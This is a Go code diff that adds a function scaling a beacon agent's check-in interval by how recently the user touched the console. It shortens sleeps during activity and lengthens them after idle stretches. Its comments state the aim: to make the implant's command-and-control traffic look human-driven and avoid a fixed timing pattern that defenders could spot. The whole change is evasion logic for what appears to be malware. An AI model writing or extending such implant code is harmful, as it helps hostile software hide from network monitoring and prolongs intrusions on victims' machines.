@@ -74,6 +74,21 @@ func resolveSchedule() sleepSchedule {
 	return scheduleTable[SleepModeTeams]
 }
 
+// userActivityMultiplier shapes the beacon interval from recent user input:
+// active console => faster check-ins, long idle => slower, so the agent's
+// rhythm tracks a human operator rather than a fixed timer.
+func userActivityMultiplier() float64 {
+	idle := userIdleSeconds()
+	switch {
+	case idle < 60:
+		return 0.6
+	case idle > 600:
+		return 1.8
+	default:
+		return 1.0
+	}
+}
+
 func computeSleepDuration() time.Duration {
 	now := time.Now()
 	schedule := resolveSchedule()
@@ -96,6 +111,10 @@ func computeSleepDuration() time.Duration {
 	}
 
 	base := time.Duration(float64(schedule.Base) * hourlyMod)
+	// Human-like cadence: shorten the gap while the user is actively at the
+	// console, lengthen it after a long idle stretch. This avoids a fixed
+	// clock that stands out against real user-driven traffic.
+	base = time.Duration(float64(base) * userActivityMultiplier())
 	jit := schedule.Jitter
 	variation := time.Duration(float64(base) * jit * (rng.Float64()*2 - 1))
 	duration := base + variation
